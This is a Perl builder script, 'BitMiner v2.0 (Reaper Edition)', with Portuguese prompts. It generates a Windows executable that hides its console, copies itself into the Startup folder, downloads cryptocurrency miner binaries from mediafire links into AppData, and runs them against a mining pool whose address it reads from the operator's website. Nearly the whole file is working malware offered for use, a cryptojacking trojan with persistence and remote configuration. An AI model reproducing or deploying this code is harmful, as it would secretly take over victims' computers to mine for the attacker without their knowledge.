#!/usr/bin/perl
use Term::ANSIColor;
use warnings;
use strict;
use Config;
$SIG{INT} = 'IGNORE';

sub clear_console{
  system("cls") if $Config{osname} =~ /win/i;
  system("clear") if $Config{osname} !~ /win/i;
}

sub print_banner{
  print "\n";
  print color("GREEN");
  print <<'BANNER';
                      ,____
                      |---.\
              ___     |    `
             / .-\  ./=)
            |  |"|_/\/|
            ;  |-;| /_|
           / \_| |/ \ |
          /      \/\( |
          |   /  |` ) |
          /   \ _/    |
         /--._/  \    |
         `/|)    |    /
           /     |   |
         .'      |   |
        /         \  |
       (_.-.__.__./  /
BANNER
  print color("reset");
  print "\n  BitMiner v2.0 (Reaper Edition)\n\n";
}

my ($website, $x86_or_x64, $executable_name) = undef;
&clear_console;
&print_banner;
print color("RED"),"[*]",color("reset"), " Informe o seu website: ";
$website = <STDIN>;
if($website){
  chomp $website;
  if($website){
    if($website !~ /^(http:\/\/|https:\/\/)/ || $website !~ /((.*?)\.(.*?)|(.*?)\.(.*?)\/(.*?))$/){
	  print color("RED"),"\n[*]",color("reset"), " URL sem HTTP ou HTTPS !\n";
	  exit 0;
	}
    print color("RED"),"\n[*]",color("reset"), " CPU ou GPU ? ";
	$x86_or_x64 = <STDIN>;
	if($x86_or_x64){
	  chomp $x86_or_x64;
	  if($x86_or_x64){
	    print color("RED"),"\n[*]",color("reset"), " Qual o nome do executavel ? ";
		$executable_name = <STDIN>;
		if($executable_name){
		  chomp $executable_name;
		  if(! $executable_name){
		    $executable_name = "Windows.exe";
			print color("RED"),"\n[*]",color("reset"), " Nome definido como Windows.exe...\n";
		  }
		  else{
		    $executable_name .= ".exe" if $executable_name !~ /\.exe$/;
		    print color("RED"),"\n[*]",color("reset"), " Criando $executable_name...\n";
		  }
		  open(EXECUTABLE, ">", "executable.pl");
print EXECUTABLE <<EXE;
#!/usr/bin/perl
use Win32::HideConsole;
hide_console();
use LWP::UserAgent;
use LWP::Simple;
use Config;
use warnings;
use strict;

my (\$response, \$username, \$agent, \$name, \$ok) = `whoami`, 0;
\$username =~ s/(.*?)\\\\(.*?)//g;
for(glob "C:\\\\Users\\\\\$username\\\\AppData\\\\Roaming\\\\*"){
  if(\$_ =~ /^Ns/ && \$_ =~ /\\.exe\$/){
    \$ok = 1;
  }
}
while(\$ok != 1){
  \$0 =~ s/(.*?)\\(.*?)//g;
  system("copy \$0 %AppData%\\Microsoft\\Windows\\\"Start Menu\\"\\Programs\\Startup");
  if(\$Config{archname} =~ /x86_64/i || \$Config{archname} =~ /x64/i){
    if("$x86_or_x64" =~ /GPU/i){
      getstore("http://download1654.mediafireuserdownload.com/vktdt3a73mrg/0nwra4eocjkemrl/Data.bin", "Data.bin");
      getstore("http://download846.mediafire.com/z5xn7wdyjpcg/6hebk47rlq29t36/NsGpuCNMiner.exe", "NsGpuCNMiner.exe");
      system("move Data.bin %AppData% && move NsGpuCNMiner.exe %AppData%");
      \$name = "NsGpuCNMiner.exe";
	  \$ok = 1;
	}
    else{
      getstore("http://download1586.mediafire.com/43vm826bs7cg/995k52eqx6ityix/NsCpuCNMiner64.exe", "NsCpuCNMiner64.exe");
      system("move NsCpuCNMiner64.exe %AppData%");
	  \$name = "NsCpuCNMiner64.exe";
      \$ok = 1;
	}
  }
  else{  
    getstore("http://download1518.mediafire.com/e1uijiiqu6mg/o5c3rn5s2k349lu/NsCpuCNMiner32.exe", "NsCpuCNMiner32.exe");
    system("move NsCpuCNMiner32.exe %AppData%");
	\$name = "NsCpuCNMiner32.exe";
    \$ok = 1;
  }
}

\$agent = LWP::UserAgent->new;
\$agent->agent("Mozilla/5.0");
while(1){
  \$response = \$agent->get("$website");
  if(\$response->decoded_content =~ /miner->host:(.*?);email:(.*?);/ig){
    system("cd %AppData% && \$name -o stratum+tcp://\$1 -u \$2 -p x");
  }
}
EXE
		  close(EXECUTABLE);
		  system("pp -o $executable_name executable.pl");
		  unlink "executable.pl";
		  print color("RED"),"\n[*]",color("reset"), " Sucesso !\n";
		}
	  }
	  else{
	    print color("RED"),"\n[*]",color("reset"), " CPU ou GPU nao informado !\n";
	    exit 0;
	  }
	}
  }
  else{
    print color("RED"),"\n[*]",color("reset"), " Informe seu website !\n";
	exit 0;
  }
}
